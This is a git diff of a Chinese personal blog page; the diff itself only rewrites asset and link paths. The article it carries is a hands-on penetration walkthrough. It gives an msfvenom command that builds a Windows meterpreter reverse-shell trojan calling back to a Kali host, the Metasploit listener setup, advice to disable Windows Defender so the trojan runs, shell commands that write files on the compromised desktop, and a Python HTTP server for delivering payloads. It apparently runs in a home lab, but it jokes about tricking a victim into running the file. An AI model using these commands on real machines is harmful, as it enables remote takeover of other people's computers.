@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../img/fluid.png">
+  <link rel="icon" href="../../../../img/fluid.png">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -26,22 +26,22 @@
 <meta property="og:site_name" content="Harden的个人博客">
 <meta property="og:description" content="前言 正常的流程就是把物理机的人骗去点一些不该点的东西  方法一——Metasploit 生成木马（Payload）+ 监听反弹 Shell 的渗透玩法）渗透思路 生成木马 $\rightarrow$ 投毒执行 $\rightarrow$ 控制权限 $\rightarrow$ 远程写文件    🚀 第一步：在 Kali 上制作 Windows 攻击木马打开 Kali 终端，利用 msfvenom">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://harden13131.github.io/9606191efed1d4bd72fd0c4823f3d7c7.png">
-<meta property="og:image" content="https://harden13131.github.io/be070c7848f435856d8e67e9ec15a603.png">
-<meta property="og:image" content="https://harden13131.github.io/17b34f79a41d1be270ee5d4306db8c85.png">
-<meta property="og:image" content="https://harden13131.github.io/71836f05b2dc721b91458822b25b5fea.png">
-<meta property="og:image" content="https://harden13131.github.io/8398e6ca155fec95b33d8a18bb7fb8ff.png">
-<meta property="og:image" content="https://harden13131.github.io/image-8.png">
-<meta property="og:image" content="https://harden13131.github.io/image-9.png">
-<meta property="og:image" content="https://harden13131.github.io/image-7.png">
-<meta property="og:image" content="https://harden13131.github.io/a512432fe9f4b4a9bae8e3d76c279a62.png">
-<meta property="og:image" content="https://harden13131.github.io/993a72e10710e326552c78b1b79b527d.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/9606191efed1d4bd72fd0c4823f3d7c7.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/be070c7848f435856d8e67e9ec15a603.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/17b34f79a41d1be270ee5d4306db8c85.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/71836f05b2dc721b91458822b25b5fea.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/8398e6ca155fec95b33d8a18bb7fb8ff.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/image-8.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/image-9.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/image-7.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/a512432fe9f4b4a9bae8e3d76c279a62.png">
+<meta property="og:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/993a72e10710e326552c78b1b79b527d.png">
 <meta property="article:published_time" content="2026-07-26T01:50:46.000Z">
 <meta property="article:modified_time" content="2026-08-01T08:11:47.309Z">
 <meta property="article:author" content="画竹子的熊猫">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://harden13131.github.io/9606191efed1d4bd72fd0c4823f3d7c7.png">
+<meta name="twitter:image" content="https://harden13131.github.io/2026/07/26/%E5%B0%9D%E8%AF%95%E4%B8%80%E6%AC%A1kali%E5%85%A5%E4%BE%B5%E7%89%A9%E7%90%86%E6%9C%BA/9606191efed1d4bd72fd0c4823f3d7c7.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -71,18 +71,18 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+<link  rel="stylesheet" href="../../../../css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="../../../../css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../css/highlight-dark.css" />
   
 
 
 
   
-<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="../../../../css/custom.css">
 
 
 
@@ -96,8 +96,8 @@
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <script  src="../../../../js/utils.js" ></script>
+  <script  src="../../../../js/color-schema.js" ></script>
   
 
 
@@ -134,7 +134,7 @@
 <div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">
+    <a class="navbar-brand" href="../../../../index.html">
       <strong>Fluid</strong>
     </a>
 
@@ -153,7 +153,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
+              <a class="nav-link" href="../../../../index.html" target="_self">
                 <i class="iconfont icon-home-fill"></i>
                 <span>首页</span>
               </a>
@@ -165,7 +165,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
+              <a class="nav-link" href="../../../../archives/" target="_self">
                 <i class="iconfont icon-archive-fill"></i>
                 <span>归档</span>
               </a>
@@ -177,7 +177,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
+              <a class="nav-link" href="../../../../categories/" target="_self">
                 <i class="iconfont icon-category-fill"></i>
                 <span>分类</span>
               </a>
@@ -189,7 +189,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
+              <a class="nav-link" href="../../../../tags/" target="_self">
                 <i class="iconfont icon-tags-fill"></i>
                 <span>标签</span>
               </a>
@@ -201,7 +201,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
+              <a class="nav-link" href="../../../../about/" target="_self">
                 <i class="iconfont icon-user-fill"></i>
                 <span>关于</span>
               </a>
@@ -239,7 +239,7 @@
           
           
             <div class="col-4 mobile-grid-cell">
-              <a href="/" target="_self">
+              <a href="../../../../index.html" target="_self">
                 <div class="mobile-grid-item">
                   <i class="iconfont icon-home-fill"></i>
                   <span>首页</span>
@@ -253,7 +253,7 @@
           
           
             <div class="col-4 mobile-grid-cell">
-              <a href="/archives/" target="_self">
+              <a href="../../../../archives/" target="_self">
                 <div class="mobile-grid-item">
                   <i class="iconfont icon-archive-fill"></i>
                   <span>归档</span>
@@ -267,7 +267,7 @@
           
           
             <div class="col-4 mobile-grid-cell">
-              <a href="/categories/" target="_self">
+              <a href="../../../../categories/" target="_self">
                 <div class="mobile-grid-item">
                   <i class="iconfont icon-category-fill"></i>
                   <span>分类</span>
@@ -281,7 +281,7 @@
           
           
             <div class="col-4 mobile-grid-cell">
-              <a href="/tags/" target="_self">
+              <a href="../../../../tags/" target="_self">
                 <div class="mobile-grid-item">
                   <i class="iconfont icon-tags-fill"></i>
                   <span>标签</span>
@@ -295,7 +295,7 @@
           
           
             <div class="col-4 mobile-grid-cell">
-              <a href="/about/" target="_self">
+              <a href="../../../../about/" target="_self">
                 <div class="mobile-grid-item">
                   <i class="iconfont icon-user-fill"></i>
                   <span>关于</span>
@@ -334,7 +334,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('../../../../img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -426,17 +426,17 @@
 </blockquote>
 <h3 id="🚀-第一步：在-Kali-上制作-Windows-攻击木马"><a href="#🚀-第一步：在-Kali-上制作-Windows-攻击木马" class="headerlink" title="🚀 第一步：在 Kali 上制作 Windows 攻击木马"></a>🚀 第一步：在 Kali 上制作 Windows 攻击木马</h3><p>打开 Kali 终端，利用 msfvenom 生成一个标准的 Windows 可执行程序（.exe）：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 替换 LHOST 为你的 Kali IP 地址（用 ip a 查看）</span><br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.249.129 LPORT=4444 -f exe -o ~/hacked.exe<br></code></pre></td></tr></table></figure>
-<p><img src="/9606191efed1d4bd72fd0c4823f3d7c7.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>这个 hacked.exe 就是我们发往 Windows 的“特洛伊木马”。</p>
+<p><img src="9606191efed1d4bd72fd0c4823f3d7c7.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>这个 hacked.exe 就是我们发往 Windows 的“特洛伊木马”。</p>
 <h3 id="🚀-第二步：在-Kali-上开启监听“陷阱”"><a href="#🚀-第二步：在-Kali-上开启监听“陷阱”" class="headerlink" title="🚀 第二步：在 Kali 上开启监听“陷阱”"></a>🚀 第二步：在 Kali 上开启监听“陷阱”</h3><p><code>木马</code>运行后会主动连接 Kali，我们需要在 Kali 端开启监听等待它“上钩”—这就是<strong>钓鱼</strong>  </p>
 <ol>
 <li>在 Kali 终端输入 msfconsole 打开 Metasploit 控制台。</li>
 <li>依次输入以下配置命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.249.129   <span class="hljs-comment"># 换成你的 Kali IP</span><br><span class="hljs-built_in">set</span> LPORT 4444<br>run<br></code></pre></td></tr></table></figure>
-<img src="/be070c7848f435856d8e67e9ec15a603.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
+<img src="be070c7848f435856d8e67e9ec15a603.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
 </ol>
 <p>这个时候就差那个倒霉蛋点开了那个木马程序（doge）</p>
 <h3 id="🚀-第三步：在-Windows-物理机上线（投毒）"><a href="#🚀-第三步：在-Windows-物理机上线（投毒）" class="headerlink" title="🚀 第三步：在 Windows 物理机上线（投毒）"></a>🚀 第三步：在 Windows 物理机上线（投毒）</h3><ol>
 <li>把刚才在 Kali 生成的 ~&#x2F;hacked.exe 文件传到 Windows 物理机上</li>
-<li>在 Windows 上双击运行 hacked.exe。<br><code>注意</code>:因为这是未经伪装的原生木马，Windows Defender（杀毒软件）一定会拦截报警。请先临时关闭 Windows 的“实时保护”，或者把这个文件加入信任区。<br><img src="/17b34f79a41d1be270ee5d4306db8c85.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>呜呜呜，被注入了&amp;&amp;&amp;<br><img src="/71836f05b2dc721b91458822b25b5fea.png" srcset="/img/loading.gif" lazyload alt="alt text"><br><img src="/8398e6ca155fec95b33d8a18bb7fb8ff.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
+<li>在 Windows 上双击运行 hacked.exe。<br><code>注意</code>:因为这是未经伪装的原生木马，Windows Defender（杀毒软件）一定会拦截报警。请先临时关闭 Windows 的“实时保护”，或者把这个文件加入信任区。<br><img src="17b34f79a41d1be270ee5d4306db8c85.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>呜呜呜，被注入了&amp;&amp;&amp;<br><img src="71836f05b2dc721b91458822b25b5fea.png" srcset="/img/loading.gif" lazyload alt="alt text"><br><img src="8398e6ca155fec95b33d8a18bb7fb8ff.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
 </ol>
 <h3 id="🎯-第四步：控制-Windows-并写入-txt-文件！"><a href="#🎯-第四步：控制-Windows-并写入-txt-文件！" class="headerlink" title="🎯 第四步：控制 Windows 并写入 .txt 文件！"></a>🎯 第四步：控制 Windows 并写入 .txt 文件！</h3><blockquote>
 <p>当 Windows 运行木马的瞬间，Kali 的 MSF 终端会立刻弹出一行绿字：</p>
@@ -450,10 +450,10 @@
 <ol>
 <li>切换到 Windows 物理机的桌面目录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入 Windows 当前用户的桌面（根据你 Windows 的实际用户名修改，比如 Admin/Lenovo）</span><br><span class="hljs-built_in">cd</span> C:/Users/你的Windows用户名/Desktop<br></code></pre></td></tr></table></figure></li>
 <li>隔空写入 txt 文件（渗透宣告！）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 shell 命令直接在 Windows 桌面生成文本文件</span><br>shell<br><span class="hljs-built_in">echo</span> Hello! Your Windows has been hacked by Kali Linux &gt; hacked.txt<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
-<img src="/image-8.png" srcset="/img/loading.gif" lazyload alt="alt text"><br><img src="/image-9.png" srcset="/img/loading.gif" lazyload alt="alt text"><br><em><strong>bingo</strong></em></li>
+<img src="image-8.png" srcset="/img/loading.gif" lazyload alt="alt text"><br><img src="image-9.png" srcset="/img/loading.gif" lazyload alt="alt text"><br><em><strong>bingo</strong></em></li>
 </ol>
 <hr>
-<p>这个是另一种指令来测验  嘉豪之术（<strong>DIR</strong>）<br><img src="/image-7.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>这个是另一种指令来测验  嘉豪之术（<strong>DIR</strong>）<br><img src="image-7.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
 <h2 id="第二种方法-利用-Python-搭建简易-HTTP-投毒服务器"><a href="#第二种方法-利用-Python-搭建简易-HTTP-投毒服务器" class="headerlink" title="第二种方法___利用 Python 搭建简易 HTTP 投毒服务器"></a>第二种方法___利用 Python 搭建简易 HTTP 投毒服务器</h2><h3 id="第一步：在-Kali-上准备好你要投递的文件"><a href="#第一步：在-Kali-上准备好你要投递的文件" class="headerlink" title="第一步：在 Kali 上准备好你要投递的文件"></a>第一步：在 Kali 上准备好你要投递的文件</h3><p>我们在 Kali 的 Desktop 目录下写好了一个文件 hacked.txt（或者黑客的攻击 payload、脚本等）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到你想作为 Web 根目录的文件夹</span><br><span class="hljs-built_in">cd</span> ~/Desktop<br><br><span class="hljs-comment"># 创建你的测试文件</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello! This file was downloaded from Kali HTTP Server!&quot;</span> &gt; hacked.txt<br></code></pre></td></tr></table></figure>
 <h3 id="第二步：在-Kali-端一键启动-Python-HTTP-服务"><a href="#第二步：在-Kali-端一键启动-Python-HTTP-服务" class="headerlink" title="第二步：在 Kali 端一键启动 Python HTTP 服务"></a>第二步：在 Kali 端一键启动 Python HTTP 服务</h3><blockquote>
@@ -462,9 +462,9 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 8080<br></code></pre></td></tr></table></figure>
 <h3 id="第三步：在Windows端登录伪造的web"><a href="#第三步：在Windows端登录伪造的web" class="headerlink" title="第三步：在Windows端登录伪造的web"></a>第三步：在Windows端登录伪造的web</h3><ul>
 <li>Python 会立刻把这个文件夹变成一个标准的 Web 站点，监听在 8080 端口</li>
-<li>终端会显示：Serving HTTP on 0.0.0.0 port 8080 …<br><img src="/a512432fe9f4b4a9bae8e3d76c279a62.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
+<li>终端会显示：Serving HTTP on 0.0.0.0 port 8080 …<br><img src="a512432fe9f4b4a9bae8e3d76c279a62.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
 <li>下载之后就可以发现显示</li>
-<li><img src="/993a72e10710e326552c78b1b79b527d.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
+<li><img src="993a72e10710e326552c78b1b79b527d.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
 </ul>
 <hr>
 <blockquote>
@@ -482,7 +482,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+        <a href="../../../../tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
       
     </div>
   
@@ -539,7 +539,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/07/30/BP%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/" title="BP的学习（一）">
+                      <a href="../../30/BP%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/" title="BP的学习（一）">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">BP的学习（一）</span>
                         <span class="visible-mobile">上一篇</span>
@@ -549,7 +549,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/07/25/%E4%BA%89%E5%8F%96%E6%9A%91%E5%81%87%E6%8B%BF%E4%B8%8B%E7%AC%AC%E4%B8%80%E4%B8%AAEDUsrc%E6%BC%8F%E6%B4%9E/" title="争取暑假拿下第一个EDUsrc漏洞">
+                      <a href="../../25/%E4%BA%89%E5%8F%96%E6%9A%91%E5%81%87%E6%8B%BF%E4%B8%8B%E7%AC%AC%E4%B8%80%E4%B8%AAEDUsrc%E6%BC%8F%E6%B4%9E/" title="争取暑假拿下第一个EDUsrc漏洞">
                         <span class="hidden-mobile">争取暑假拿下第一个EDUsrc漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -704,8 +704,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script  src="../../../../js/events.js" ></script>
+<script  src="../../../../js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -727,7 +727,7 @@
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
+    <script  src="../../../../js/img-lazyload.js" ></script>
   
 
 
@@ -890,7 +890,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/js/local-search.js" ></script>
+  <script  src="../../../../js/local-search.js" ></script>
 
   <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
@@ -900,7 +900,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script  src="../../../../js/boot.js" ></script>
 
 
   
